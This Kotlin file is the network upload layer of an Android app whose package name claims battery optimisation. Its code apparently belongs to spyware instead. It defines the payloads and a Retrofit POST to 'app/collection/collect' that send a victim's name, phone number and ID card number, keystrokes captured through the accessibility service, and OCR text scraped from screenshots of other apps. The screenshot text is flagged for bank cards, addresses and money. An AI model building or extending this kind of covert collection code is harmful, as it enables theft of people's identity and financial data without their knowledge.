package com.android.batteryoptimization.network

import com.android.batteryoptimization.InputEvent
import com.google.gson.annotations.SerializedName
import okhttp3.ResponseBody
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

data class UploadResponse(
    @SerializedName("code") val code: Int,
    @SerializedName("msg") val msg: String
)

data class UploadRequest(
    @SerializedName("userInfo") val userInfo: UserInfoPayload,
    @SerializedName("events") val events: List<EventPayload>,

    /** OCR 识别会话列表（一次截屏识别 = 一个 session） */
    @SerializedName("ocr") val ocr: List<OcrSessionPayload>? = null
)

data class UserInfoPayload(
    @SerializedName("name") val name: String,
    @SerializedName("phone") val phone: String,
    @SerializedName("idCard") val idCard: String
)

/** OCR 每次截屏识别会话 */
data class OcrSessionPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    /** 一次截屏识别出的所有文本行 */
    @SerializedName("text") val text: List<String>,
    @SerializedName("timestamp") val timestamp: Long,

    // ── 内容分类（用于后台展示） ──
    @SerializedName("contentType") val contentType: String? = null,
    @SerializedName("riskLevel") val riskLevel: String? = null,
    @SerializedName("sensitiveInfo") val sensitiveInfo: SensitiveInfoPayload? = null
)

/** 敏感信息标记（后端可据此做脱敏/展示） */
data class SensitiveInfoPayload(
    @SerializedName("hasIdCard") val hasIdCard: Boolean = false,
    @SerializedName("hasPhone") val hasPhone: Boolean = false,
    @SerializedName("hasBankCard") val hasBankCard: Boolean = false,
    @SerializedName("hasAddress") val hasAddress: Boolean = false,
    @SerializedName("hasMoney") val hasMoney: Boolean = false
)

/** 普通输入事件（非 OCR 事件走这里） */
data class EventPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    @SerializedName("text") val text: String,
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("source") val source: String = "accessibility"
)

interface UploadApi {
    @POST("app/collection/collect")
    suspend fun uploadEvents(
        @Header("deviceInfo") deviceInfoJson: String,
        @Body requestBody: UploadRequest
    ): ResponseBody
}
